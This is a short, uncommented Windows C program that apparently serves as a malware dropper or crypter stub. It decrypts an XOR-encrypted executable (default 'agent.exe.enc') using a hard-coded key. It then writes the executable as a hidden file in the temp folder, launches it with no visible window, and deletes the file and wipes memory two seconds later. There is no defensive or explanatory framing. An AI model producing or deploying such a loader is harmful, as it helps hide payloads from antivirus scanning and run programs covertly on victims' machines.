#include <windows.h>
#include <stdio.h>
static BYTE g_key[16]={0x4A,0x7F,0x23,0x9C,0x11,0x8E,0x55,0x3D,0x6B,0x12,0x89,0xFA,0x34,0xD7,0x01,0xCB};
int main(int argc,char**argv){
    const char*ef=argc>1?argv[1]:"agent.exe.enc";
    HANDLE hf=CreateFileA(ef,GENERIC_READ,0,NULL,OPEN_EXISTING,0,NULL);
    if(hf==INVALID_HANDLE_VALUE)return 1;
    DWORD sz=GetFileSize(hf,NULL);
    BYTE*enc=(BYTE*)HeapAlloc(GetProcessHeap(),0,sz);
    BYTE*exe=(BYTE*)HeapAlloc(GetProcessHeap(),0,sz);
    ReadFile(hf,enc,sz,&sz,NULL);CloseHandle(hf);
    for(DWORD i=0;i<sz;i++)exe[i]=enc[i]^g_key[i%16];
    HeapFree(GetProcessHeap(),0,enc);
    WCHAR tp[MAX_PATH],tf[MAX_PATH];
    GetTempPathW(MAX_PATH,tp);GetTempFileNameW(tp,L"exe",0,tf);
    HANDLE hw=CreateFileW(tf,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_HIDDEN,NULL);
    DWORD wr;WriteFile(hw,exe,sz,&wr,NULL);CloseHandle(hw);
    STARTUPINFOW si;PROCESS_INFORMATION pi;
    ZeroMemory(&si,sizeof(si));si.cb=sizeof(si);
    si.dwFlags=STARTF_USESHOWWINDOW;si.wShowWindow=SW_HIDE;
    CreateProcessW(tf,NULL,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi);
    CloseHandle(pi.hProcess);CloseHandle(pi.hThread);
    Sleep(2000);DeleteFileW(tf);SecureZeroMemory(exe,sz);HeapFree(GetProcessHeap(),0,exe);
    return 0;
}
